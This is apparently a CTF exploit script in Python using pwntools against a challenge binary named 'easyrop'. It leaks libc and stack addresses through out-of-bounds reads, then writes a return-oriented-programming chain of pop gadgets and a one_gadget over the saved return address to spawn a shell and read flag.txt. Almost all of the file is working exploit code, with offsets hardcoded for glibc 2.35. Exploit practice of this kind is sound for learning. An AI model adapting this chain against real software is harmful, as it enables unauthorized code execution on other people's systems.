#!/usr/bin/env python3

from pwn import *

elf = ELF("./easyrop.elf")
libc = ELF("./libc.so.6")
# GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.
g = ROP(libc)

# s  = remote("challs.tfcctf.com", 32744)
s = process(elf.path, env={"LD_PRELOAD":"./libc.so.6"})

# 124		trash[0]
# 125		trash[1]
# xxx		canary[0]	<----
# 127		canary[1]
# 128		rbp[0]		some writable address + 0x78
# xxx		rbp[1]		some writable address + 0x78
# 130		ret[0]		pop rsi; pop r15; ret
# 131		ret[1]		pop rsi; pop r15; ret
# xxx		a[0]		0x0
# 133		a[1]		0x0
# 134		b[0]		trash
# xxx		b[1]		trash
# 136		c[0]		pop rdx; pop r12; ret
# 137		c[1]		pop rdx; pop r12; ret
# xxx		d[0]		0x0
# 139		d[1]		0x0
# 140		e[0]		trash
# xxx		e[1]		trash
# 142		f[0]		one_gadget
# 143		f[1]		one_gadget
# xxx		c[0]		...

def main():

	# leak libc_base
	start_libc = u64(p32(read(170)) + p32(read(151)))
	libc.address = start_libc - libc.sym["__libc_start_main"] - 128

	# leak stack_base
	stack_base = u64(p32(read(172)) + p32(read(139))) - 0x328

	# prepare addresses
	pop_rsi_r15 = libc.address + g.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
	pop_rdx_r12 = libc.address + g.find_gadget(['pop rdx', 'pop r12', 'ret'])[0]
	one_gadget = libc.address + 0xebcf8

	write(128, elf.sym["__bss_start"] + 0x78)
	
	for i in range(130, 154, 6):
		write_x2(i, pop_rdx_r12)		# pass until zeros in stack

	write_x2(154, pop_rdx_r12)			# mb zero
	write_x2(154 + 6, pop_rsi_r15)		# mb zero
	write_x2(154 + 12, pop_rsi_r15)		# mb zero
	write_x2(154 + 18, one_gadget)
	s.sendline(b'5')					# exit from logic() <=> /bin/sh
	s.sendline(b'cat flag.txt')

	s.interactive()


def write(id, num):
	s.recvuntil(b'Welcome to easyrop!\n')
	s.sendlineafter(b'Press \'1\' to write and \'2\' to read!', b'1')
	s.sendlineafter(b'Select index: ', str(id).encode())
	s.sendlineafter(b'Select number to write: ', str(num).encode())


def write_x2(id, num):
	num_low = u32(p64(num)[:4])
	num_hi = u32(p64(num)[4:])

	s.recvuntil(b'Welcome to easyrop!\n')
	s.sendlineafter(b'Press \'1\' to write and \'2\' to read!', b'1')
	s.sendlineafter(b'Select index: ', str(id).encode())
	s.sendlineafter(b'Select number to write: ', str(num_low).encode())

	s.recvuntil(b'Welcome to easyrop!\n')
	s.sendlineafter(b'Press \'1\' to write and \'2\' to read!', b'1')
	s.sendlineafter(b'Select index: ', str(id + 1).encode())
	s.sendlineafter(b'Select number to write: ', str(num_hi).encode())


def read(id):
	s.recvuntil(b'Welcome to easyrop!\n')
	s.sendlineafter(b'Press \'1\' to write and \'2\' to read!', b'2')
	s.sendlineafter(b'Select index: ', str(id).encode())
	s.recvuntil(f'The number at index {id} is '.encode())
	return eval(b'0x' + s.recvline(False))

if __name__=="__main__":
	main()